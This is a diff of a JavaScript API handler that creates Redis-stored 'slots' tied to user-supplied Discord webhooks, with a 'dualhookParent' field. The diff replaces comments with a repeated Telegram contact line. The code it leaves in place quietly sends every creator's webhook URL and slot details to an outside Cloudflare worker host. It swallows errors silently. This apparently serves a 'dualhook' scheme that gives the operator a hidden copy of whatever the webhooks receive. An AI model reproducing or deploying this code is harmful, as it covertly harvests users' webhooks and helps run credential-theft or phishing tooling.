@@ -1,7 +1,7 @@
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev';
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function redisGet(key) {
   const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
     headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
@@ -9,7 +9,7 @@ async function redisGet(key) {
   const json = await res.json();
   return json.result;
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function redisSet(key, value) {
   const res = await fetch(
     `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
@@ -18,7 +18,7 @@ async function redisSet(key, value) {
   return res.ok;
 }
 
-// NEW: Send raw data to Worker instead of formatted messages
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function notifyWorker(endpoint, data) {
   try {
     await fetch(`${WORKER_URL}${endpoint}`, {
@@ -28,7 +28,7 @@ async function notifyWorker(endpoint, data) {
     });
   } catch (_) {}
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 async function notifyCreatorWebhook(webhookUrl, url, slug, displayName, type) {
   if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
   try {
@@ -53,7 +53,7 @@ async function notifyCreatorWebhook(webhookUrl, url, slug, displayName, type) {
     });
   } catch (_) {}
 }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -68,7 +68,7 @@ export default async function handler(req, res) {
   }
 
   const { name, displayName, webhook, inviteUrl, charUrl, type, dualhookParent } = body || {};
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
   if (!name)    return res.status(400).json({ error: 'name is required' });
   if (!webhook) return res.status(400).json({ error: 'webhook is required' });
 
@@ -88,7 +88,7 @@ export default async function handler(req, res) {
     if (existing !== null) {
       return res.status(200).json({ taken: true });
     }
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
     const record = {
       slug,
       displayName:    displayName    || slug,
@@ -99,7 +99,7 @@ export default async function handler(req, res) {
       dualhookParent: dualhookParent || null,
       createdAt:      new Date().toISOString()
     };
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
     const ok = await redisSet(`slot:${slug}`, record);
     if (!ok) return res.status(500).json({ error: 'Failed to save' });
 
@@ -107,7 +107,7 @@ export default async function handler(req, res) {
 
     await notifyCreatorWebhook(webhook, url, slug, record.displayName, record.type);
 
-    // UPDATED: Send raw data to Worker - let Worker format the messages
+    // IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
     await notifyWorker('/notify/create', {
       slug,
       displayName: record.displayName,
@@ -119,12 +119,12 @@ export default async function handler(req, res) {
       createdAt: record.createdAt
     });
 
-    // UPDATED: Send raw data to Worker for webhook tracking
+    // IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
     await notifyWorker('/notify/webhook', {
       type: record.type,
       webhook: webhook
     });
-
+// IF YOU WANNA TALK TO ME MSG ME ON TELE @JOHNTATEe
     return res.status(200).json({ success: true, url, slug });
 
   } catch (err) {
